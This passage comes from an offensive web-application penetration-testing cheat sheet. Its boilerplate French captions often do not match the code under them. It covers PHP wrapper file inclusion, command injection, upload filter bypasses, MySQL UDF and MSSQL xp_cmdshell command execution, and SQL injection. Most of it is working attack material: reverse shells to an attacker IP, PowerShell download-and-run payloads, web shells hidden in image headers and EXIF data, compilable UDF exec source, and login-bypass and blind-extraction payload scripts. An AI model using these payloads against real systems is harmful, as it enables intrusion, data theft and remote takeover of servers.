C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```


### PHP Wrappers

Examiner les entrées et les réponses de l'application web.


**Paramètres et repères :**
`php://filter`  


Récupérer une ressource distante ou une réponse HTTP.

```bash
curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"

# Decode base64-encoded output
echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
```


**Paramètres et repères :**
`php://data`  


Récupérer une ressource distante ou une réponse HTTP.

```bash
curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"

# Encode PHP payload in base64:
echo -n '<?php echo system($_GET["cmd"]); ?>' | base64
```


### OS Command Injection

Examiner les entrées et les réponses de l'application web.


Exemple technique pour la rubrique « OS Command Injection ».

```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```


Commande `iex` pour la rubrique « OS Command Injection ».

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell
```


Récupérer une ressource distante ou une réponse HTTP.

```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
```


## File Upload

Examiner les entrées et les réponses de l'application web.


**Paramètres et repères :**
`.php` · `.aspx`  


### Extensions Blacklist


**Paramètres et repères :**
`ffuf` · `BurpSuite`  


Commande `.jpeg.php` pour la rubrique « Extensions Blacklist ».

```text
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```


### Extensions Whitelist


Exemple technique pour la rubrique « Extensions Whitelist ».

```bash
# This only checks if the whitelist are there in the file upload and not if it ends with it.
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```


### Bypassing Filters


Commande `.php` pour la rubrique « Bypassing Filters ».

```text
# For PHP
.pHP, .phps, .php7, .php4, .php5, .php3, .xxx

# For ASP(X)
.aspx, .asp, .ashx, .asmx
```


**Paramètres et repères :**
`.htaccess`  


Commande `addtype` pour la rubrique « Bypassing Filters ».

```text
AddType application/x-httpd-php .dork
```


**Paramètres et repères :**
`.dork`  


Commande `echo` pour la rubrique « Bypassing Filters ».

```bash
# We can now upload [file].dork files.
echo "AddType application/x-httpd-php .dork" > .htaccess
```


**Paramètres et repères :**
`shell.php.jpg` · `shell.php.jpeg`  


Commande `if` pour la rubrique « Bypassing Filters ».

```bash
# This checks if it ends with it so double extension wont work.
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```


Commande `shell.php` pour la rubrique « Bypassing Filters ».

```text
shell.php%00.jpg
```


Exemple technique pour la rubrique « Bypassing Filters ».

```text
# For example shell.php%00.jpg works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the '%00', and store it as 'shell.php'.
%20
%0a
%00
%0d0a
/
.\
.
…
:
```


Commande `for` pour la rubrique « Bypassing Filters ».

```bash
# Script for all permutations
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```


Commande `gif89a` pour la rubrique « Bypassing Filters ».

```php
# Payload code
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
// or
GIF8
<?
system($_GET['cmd']); //or you can insert your complete shell code
?>
```


Commande `echo` pour la rubrique « Bypassing Filters ».

```bash
# Example
echo "GIF8" > text.jpg 
file text.jpg

text.jpg: GIF image data

# Code to Test MIME type of uplaoded file
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

![MIME Spoofing](https://www.emmanuelsolis.com/img/php_filters01.png)


### File Execution


Commande `http` pour la rubrique « File Execution ».

```bash
http://[TARGET_IP]/uploads/shell.php
# Autre possibilité
http://[TARGET_IP]/uploads/shell.php?cmd=whoami
```


### Embed Code into Images


**Paramètres et repères :**
`exiftool`  


Commande `exiftool` pour la rubrique « Embed Code into Images ».

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg

mv lo.jpg lo.php.jpg
```


### Embed Code into File Names


Commande `file` pour la rubrique « Embed Code into File Names ».

```text
file$(whoami).jpg
```


**Paramètres et repères :**
`whoami.jpg`  


Commande `file.jpg` pour la rubrique « Embed Code into File Names ».

```text
file.jpg||whoami
```


Commande `echo` pour la rubrique « Embed Code into File Names ».

```text
# Crate the Base64 encoded command.
echo "bash -i >& /dev/tcp/192.168.45.166/444 0>&1" | base64

# Download any normal image, and give it the name: cat.jpg.
cp cat.jpg ’|smile”`echo <base64_bash_reverse_shell> | base64 -d | bash`”.jpg’
```


## Attaques SQL

Examiner les connexions, la configuration et les requêtes de la base de données.


#### MySQL for MySQL (Linux)

Examiner les connexions, la configuration et les requêtes de la base de données.


##### Connexion initiale


Commande `mysql` pour la rubrique « Connexion initiale ».

```bash
mysql -u <username> -p -h <host>

# Then, provide the password when prompted.
```


##### Requêtes courantes


Commande `select` pour la rubrique « Requêtes courantes ».

```sql
SELECT VERSION();
```


Commande `show` pour la rubrique « Requêtes courantes ».

```sql
SHOW DATABASES;
```


Commande `use` pour la rubrique « Requêtes courantes ».

```sql
USE <database_name>;
```


##### Enumerating Tables and Columns


Commande `show` pour la rubrique « Enumerating Tables and Columns ».

```sql
SHOW TABLES;
```


Commande `show` pour la rubrique « Enumerating Tables and Columns ».

```sql
SHOW COLUMNS FROM <table_name>;
```


##### Énumération des utilisateurs and Privileges


Commande `select` pour la rubrique « Énumération des utilisateurs and Privileges ».

```sql
SELECT User, Host FROM mysql.user;
```


Commande `show` pour la rubrique « Énumération des utilisateurs and Privileges ».

```sql
SHOW GRANTS FOR '<username>'@'<host>';
```


##### Data Extraction


Commande `select` pour la rubrique « Data Extraction ».

```sql
SELECT * FROM <table_name> LIMIT <number_of_rows>;
```


##### Exécution de commandes via User-Defined Functions (UDFs)


Commande `mysql` pour la rubrique « Exécution de commandes via User-Defined Functions (UDFs) ».

```bash
mysql -u root -p -h <host> -e "use mysql; create table foo(line blob); insert into foo values(load_file('/path/to/your/udf/lib_mysqludf_sys.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
```


Commande `create` pour la rubrique « Exécution de commandes via User-Defined Functions (UDFs) ».

```sql
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
```


Commande `select` pour la rubrique « Exécution de commandes via User-Defined Functions (UDFs) ».

```sql
SELECT sys_exec('id');
```


##### Reverse Shell


Ouvrir un port d'écoute avec Netcat.

```bash
nc -lvnp 4444
```


Commande `select` pour la rubrique « Reverse Shell ».

```sql
SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
```


##### Where to Get Your .so for UDF


**Paramètres et repères :**
`.so` · `.SO` · `.c` · `lib_mysqludf_sys.so`  


Commande `my_bool` pour la rubrique « Where to Get Your .so for UDF ».

```text
// lib_mysqludf_sys.c

#include <my_global.h>
#include <my_sys.h>
#include <mysql.h>
#include <stdio.h>
#include <stdlib.h>

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
void sys_exec_deinit(UDF_INIT *initid);
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);

// Initialization function for UDF
my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_exec() requires exactly one string argument");
        return 1;
    }
    return 0;
}

// Cleanup function for UDF
void sys_exec_deinit(UDF_INIT *initid) {
    // Nothing to do
}

// Execution function
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    const char *command = args->args[0];
    return system(command);
}
```


**Paramètres et repères :**
`.so` · `mysql-server-dev`  


Commande `apt` pour la rubrique « Where to Get Your .so for UDF ».

```bash
sudo apt install mysql-server-dev libmysqlclient-dev

# Compile the source code into a .so file; the resulting lib_mysqludf_sys.so file can now be used.
gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c -lc

# -fPIC: Generates position-independent code (required for shared objects).
# -shared: Tells the compiler to generate a shared library.
# -I/usr/include/mysql: Includes MySQL development headers. 
```


**Paramètres et repères :**
`.so`  


Commande `mysql` pour la rubrique « Where to Get Your .so for UDF ».

```bash
mysql -u root -p -h <host> -e "USE mysql; 
CREATE TABLE foo(line BLOB); 
INSERT INTO foo VALUES (LOAD_FILE('/path/to/your/udf/lib_mysqludf_sys.so')); 
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
```


**Paramètres et repères :**
`.so`  


Commande `create` pour la rubrique « Where to Get Your .so for UDF ».

```sql
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
```


Commande `select` pour la rubrique « Where to Get Your .so for UDF ».

```sql
SELECT sys_exec('id');
```


**Paramètres et repères :**
`.SO` · `.so` · `lib_mysqludf_sys.so`  


Commande `mysql` pour la rubrique « Where to Get Your .so for UDF ».

```bash
# Ensure that the .so file has the proper permissions and path to be loaded correctly by MySQL.
mysql -u root -p -h <host> -e "USE mysql; 
CREATE TABLE foo(line BLOB); 
INSERT INTO foo VALUES (LOAD_FILE('/path/to/existing/lib_mysqludf_sys.so')); 
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
```


#### Mssqlclient for MSSQL (Windows)

Examiner les connexions, la configuration et les requêtes de la base de données.


##### Connexion initiale


Commande `impacket-mssqlclient` pour la rubrique « Connexion initiale ».

```bash
# Tip: you can also specify a domain by using <domain>/<username>:<password>@<host>.
impacket-mssqlclient <username>:<password>@<host> -windows-auth
```


##### Requêtes courantes


Commande `select` pour la rubrique « Requêtes courantes ».

```sql
SELECT @@version;
```


Commande `select` pour la rubrique « Requêtes courantes ».

```sql
SELECT name FROM sys.databases;
```


Commande `use` pour la rubrique « Requêtes courantes ».

```sql
USE <database_name>;
```


##### Enumerating Tables and Columns


Commande `select` pour la rubrique « Enumerating Tables and Columns ».

```sql
# Tip: replace <schema> with the actual schema name (commonly dbo).
SELECT table_name FROM <schema>.information_schema.tables;
```


Commande `select` pour la rubrique « Enumerating Tables and Columns ».

```sql
SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '<table_name>';
```


##### Énumération des utilisateurs and Privileges


Commande `select` pour la rubrique « Énumération des utilisateurs and Privileges ».

```sql
SELECT * FROM <schema>.dbo.sysusers;
```


Commande `select` pour la rubrique « Énumération des utilisateurs and Privileges ».

```sql
SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SELECT principal_id FROM <schema>.sys.database_principals WHERE name = '<username>');
```


##### Data Extraction


Commande `select` pour la rubrique « Data Extraction ».

```sql
SELECT * FROM <schema>.<table_name> LIMIT <number_of_rows>;
```


##### Exécution de commandes


Commande `exec` pour la rubrique « Exécution de commandes ».

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```


Commande `exec` pour la rubrique « Exécution de commandes ».

```sql
EXEC xp_cmdshell 'whoami';
```


**Paramètres et repères :**
`xp_cmdshell`  


Ouvrir un port d'écoute avec Netcat.

```bash
# Setup the listener
nc -lvnp 4444

# Start your HTTP Server
python3 -m http.server 80

# Then, use the following reverse shell command on the SQL server (Windows system):
# To download a payload
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/shell.ps1'')"';

# Alternative Netcat-based payload
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/reverse.ps1'')"

# To get a direct reverse shell
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''<attacker_ip>'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}"';
```


#### Tips


**Paramètres et repères :**
`xp_cmdshell`  


### Injection SQL

Examiner les connexions, la configuration et les requêtes de la base de données.


#### Common SQL Functions

Examiner les connexions, la configuration et les requêtes de la base de données.


Commande `limit` pour la rubrique « Common SQL Functions ».

```sql
LIMIT <row offset>, <number of rows>  -- Display rows based on offset and number
COUNT(*)                             -- Display number of rows
RAND()                               -- Generate random number between 0 and 1
FLOOR(RAND()*<number>)              -- Print out number part of random decimal number
SELECT (SELECT DATABASE());         -- Double query (nested) using DATABASE() as an example
GROUP BY <column name>              -- Summarize rows based on column name
CONCAT(<string1>, <string2>, ...)    -- Concatenate strings such as tables, column names
LENGTH(<string>)                     -- Calculate the number of characters for a given string
SUBSTR(<string>, <offset>, <length>) -- Print string character(s) by providing offset and length
ASCII(<character>)                   -- Decimal representation of the character
SLEEP(<number of seconds>)           -- Go to sleep for <number of seconds>
IF(<condition>, <true action>, <false action>) -- Conditional if statement
LIKE "<string>%"                     -- Checks if provided string is present
OUTFILE "<url to file>"              -- Dump output of select statement into a file
LOAD_FILE("<url to file>")          -- Dump the content of a file
```


Commande `select` pour la rubrique « Common SQL Functions ».

```sql
SELECT TOP <number> * FROM <table>   -- Equivalent of LIMIT for MSSQL
COUNT(*) AS Total                     -- Display number of rows
NEWID()                               -- Generate random unique identifier
CAST(<expression> AS <data_type>)    -- Cast expression to a specific data type
SELECT DB_NAME()                      -- Get the current database name
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>'  -- Get column names
```


#### Error-Based Payloads


Exemple technique pour la rubrique « Error-Based Payloads ».

```bash
<input>' OR 1=1 -- //
```


Exemple technique pour la rubrique « Error-Based Payloads ».

```bash
<input>' OR 1=1 in (SELECT @@version) -- //
```


Exemple technique pour la rubrique « Error-Based Payloads ».

```bash
<input>' OR 1=1 in (SELECT * FROM <table>) -- //

# Example
<input>' OR 1=1 in (SELECT * FROM users) -- //
```


Exemple technique pour la rubrique « Error-Based Payloads ».

```bash
<input>' OR 1=1 in (SELECT <column> FROM <table> WHERE <condition>) -- //

# Example
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```


#### UNION-Based Payloads


**Paramètres et repères :**
`SELECT`  


Exemple technique pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL & MSSQL
<input>' ORDER BY <number> -- -
```


**Paramètres et repères :**
`wfuzz`  


Commande `--` pour la rubrique « UNION-Based Payloads ».

```sql
-- MySQL
wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"

-- MSSQL
wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, DATABASE(), 4, 5; -- -

# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, DB_NAME(), 4, 5; -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, table_name, 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -

# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, column_name, 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -

# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -
```


Exemple technique pour la rubrique « UNION-Based Payloads ».

```bash
<input>' UNION SELECT NULL, <column_1>, <column_2>, <column_3> FROM information_schema.columns WHERE table_schema=DATABASE() -- -

# Examples
%' UNION SELECT database(), user(), @@version, null, null -- -
# or
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, CONCAT(column1, column2), 4, 5 FROM <tablename> LIMIT 0, 1; -- -

# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, column1 + column2, 4, 5 FROM <tablename> -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL & MSSQL
http://website.com/index.php?id=1 ORDER BY <number> -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL & MSSQL
http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> INTO OUTFILE "<file_path>" -- +

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> EXEC xp_cmdshell 'echo <data> > <filename>'
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@VERSION, 4, 5 -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, USER(), 4, 5 -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, SUSER_SNAME(), 4, 5 -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, SERVERPROPERTY('InstanceName'), 4, 5 -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(table_name), 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(TABLE_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(COLUMN_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -
```


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(<column_name>), 4, 5 FROM <table_name>; -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(<column_name>, ','), 4, 5 FROM <table_name>; -- -
```


**Paramètres et repères :**
`AND`  


Commande `http` pour la rubrique « UNION-Based Payloads ».

```bash
# MySQL & MSSQL
http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -
```


##### Vérification de la vulnérabilité


Commande `http` pour la rubrique « Vérification de la vulnérabilité ».

```sql
http://<host>/vulnerable-page?param=<input>' OR '1'='1 --+
```


Commande `http` pour la rubrique « Vérification de la vulnérabilité ».

```sql
http://<host>/vulnerable-page?param=<input>' AND 1=1 --+

http://<host>/vulnerable-page?param=<input>' AND '1'='1 --+

http://<host>/vulnerable-page?param=<input>' AND '1'='2 --+
```


##### Extracting Database Information


**Paramètres et repères :**
`SUBSTRING`  


Commande `http` pour la rubrique « Extracting Database Information ».

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1)='5') --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1)='5') --+
```


**Paramètres et repères :**
`SUBSTRING`  


Commande `http` pour la rubrique « Extracting Database Information ».

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND IIF(SUBSTRING(DB_NAME(),1,1)='a', WAITFOR DELAY '00:00:05', 0) --+
```


##### Extracting Table and Column Names


Commande `http` pour la rubrique « Extracting Table and Column Names ».

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM information_schema.tables) > 5 --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.tables) > 5 --+
```


Commande `http` pour la rubrique « Extracting Table and Column Names ».

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 5 --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.columns WHERE object_id = OBJECT_ID('users')) > 5 --+
```


##### Extracting Data


**Paramètres et repères :**
`SUBSTRING`  


Commande `http` pour la rubrique « Extracting Data ».

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a' --+
```


Commande `admin` pour la rubrique « Extracting Data ».

```sql
admin' AND SUBSTRING(username,1,1)='a' --+   # MySQL
admin' AND SUBSTRING(username,1,1)='a' --+   # MSSQL
```


##### Boolean-Based


**Paramètres et repères :**
`SUBSTRING`  


Commande `http` pour la rubrique « Boolean-Based ».

```sql
# MySQL
http://<host>/index.php?id=1' AND (SUBSTRING(database(), <offset>, <character_length>))='<character>' --+

# MSSQL
http://<host>/index.php?id=1' AND (SUBSTRING(DB_NAME(), <offset>, <character_length>))='<character>' --+
```


##### Time-Based


Commande `admin` pour la rubrique « Time-Based ».

```sql
# MySQL
admin' OR SLEEP(5);--+

# MSSQL
admin' OR WAITFOR DELAY '00:00:05';--+
```


Commande `http` pour la rubrique « Time-Based ».

```sql
# MySQL
http://<host>/login.php?user=admin' AND IF(1=1, SLEEP(5), 0) --+

# MSSQL
http://<host>/login.php?user=admin' AND IIF(1=1, WAITFOR DELAY '00:00:05', 0) --+
```


Commande `http` pour la rubrique « Time-Based ».

```sql
# MySQL
http://<host>/index.php?id=1' AND SLEEP(10) --+

# MSSQL
http://<host>/index.php?id=1' AND WAITFOR DELAY '00:00:10' --+
```


Commande `http` pour la rubrique « Time-Based ».

```sql
# MySQL
http://<host>/index.php?id=1' AND IF((SELECT VERSION()) LIKE '5%', SLEEP(10), NULL) --+

# MSSQL
http://<host>/index.php?id=1' AND IIF((SELECT @@VERSION) LIKE '5%', WAITFOR DELAY '00:00:10', NULL) --+
```


**Paramètres et repères :**
`wfuzz`  


Commande `for` pour la rubrique « Time-Based ».

```bash
# Uses ASCII value extraction to determine each character of the database name
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
done > <filename.txt> && grep "0m9" <filename.txt

# Replace <filename.txt> with the name of the file to store results.
# Replace 10 in $(seq 1 10) with the estimated length of the database name.
# The FUZZ keyword is used by wfuzz to iterate through ASCII values.
```


**Paramètres et repères :**
`wfuzz`  


Commande `for` pour la rubrique « Time-Based ».

```bash
# Uses ASCII value extraction to determine each character of the first table name
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
done > <filename.txt> && grep "0m9" <filename.txt

# Replace table_name and table_schema with the actual names if targeting specific databases or tables.
# Adjust LIMIT 0,1 to enumerate multiple tables by changing the first argument of LIMIT.
```


**Paramètres et repères :**
`wfuzz` · `information_schema.columns`  


Commande `for` pour la rubrique « Time-Based ».

```bash
# Uses ASCII value extraction to determine each character of a column name
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
done > <filename.txt> && grep "0m9" <filename.txt

# Replace <table_name> with the actual table name you are targeting.
# Adjust LIMIT 0,1 to retrieve column names for different tables.
```


**Paramètres et repères :**
`wfuzz`  


Commande `for` pour la rubrique « Time-Based ».

```bash
# Extracts content from a specific column using ASCII value comparison
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,0-10 -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+"; 
done > <filename.txt> && grep "0m9" <filename.txt

# Replace <column_name> with the column you're trying to extract (e.g., username, password).
# Replace <table_name> with the actual table name.
# The FUZZ value iterates over possible row entries (use LIMIT FUZZ, 1 to iterate rows).
```

![Blind SQL Injection with Tools](https://www.emmanuelsolis.com/img/automating_blind_sqli.gif)


#### Login Bypass Commandes


Commande `--` pour la rubrique « Login Bypass Commandes ».

```sql
-- Standard OR-based bypass
' OR 1=1 --+

-- Bypass with LIMIT (useful when multiple entries might be returned)
' OR 1=1 LIMIT 1 --+

-- Bypass by using string comparison (a common trick when numeric bypass fails)
' OR 'a'='a --+

-- Using AND to combine conditions and exploit certain scenarios
' OR 3=3 --+

-- More obfuscated example (avoiding use of typical 1=1):
' OR 2=2 --+

-- Bypass with string comparison (works for both MySQL and MSSQL)
' OR 'a'='a' --+

-- OR-based bypass with a numeric comparison
' OR 3=3 --+

-- Bypass with LIMIT for MySQL (restricts to 1 entry)
' OR 1=1 LIMIT 1 --+

-- MSSQL version of limiting output with TOP
' OR 1=1; SELECT TOP 1 * FROM users --+
```


Commande `meh` pour la rubrique « Login Bypass Commandes ».

```sql
meh' OR 3=3;#
meh' OR 2=2 LIMIT 1;#
meh' OR 'a'='a
meh' OR 1=1 --+
```


Commande `meh` pour la rubrique « Login Bypass Commandes ».

```sql
meh' OR 3=3;--
meh' OR 2=2;--
meh' OR 'a'='a;--
meh' OR 1=1;--
```


#### Vulnerable Code Example


Exemple technique pour la rubrique « Vulnerable Code Example ».

```php
<?php
include 'database_connection.php';
$user = $_POST['username'];
$pass = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$execution = mysqli_query($connection, $query) or die(mysqli_error($connection));
$row = mysqli_fetch_array($execution);

if($row) {
    echo "Login Successful";
} else {
    echo "Invalid username or password";
}
?>
```


### SQL Truncation

Examiner les connexions, la configuration et les requêtes de la base de données.


Exemple technique pour la rubrique « SQL Truncation ».

```text
'admin'
```


Exemple technique pour la rubrique « SQL Truncation ».

```text
'admin'
```


Commande `username` pour la rubrique « SQL Truncation ».

```sql
# Example of truncation; the database discards extra characters
username=admin++++++++(max.length)&password=testpwn123

-- Assume the database has a 10-character limit on the username field, note that more characters are added because otherwise the truncation won't be made.
username=admin++++++++&password=testpwn123

-- The database truncates the input to admin and discards the extra characters
-- If a user admin already exists, the attacker might be able to bypass authentication.
```


#### MSSQL

Examiner les connexions, la configuration et les requêtes de la base de données.


##### Default Databases


**Paramètres et repères :**
`master` · `msdb` · `model` · `resource`  
`tempdb`  


##### Commandes courantes


Commande `select` pour la rubrique « Commandes courantes ».

```sql
SELECT name FROM master.dbo.sysdatabases
```


Commande `select` pour la rubrique « Commandes courantes ».

```sql
SELECT table_name FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
```


Commande `union` pour la rubrique « Commandes courantes ».

```sql
union select 1,(select string_agg(concat(name,':',id),'|') from streamio..sysobjects where xtype='u'),3,4,5,6-- -
```


Commande `union` pour la rubrique « Commandes courantes ».

```sql
union select 1,concat(username,':',password),3,4,5,6 from users--
```


**Paramètres et repères :**
`xp_cmdshell`  


Commande `exec` pour la rubrique « Commandes courantes ».

```sql
exec xp_dirtree 'c:\'

EXEC xp_cmdshell 'ping [attacker_ip]';
```


Commande `--` pour la rubrique « Commandes courantes ».

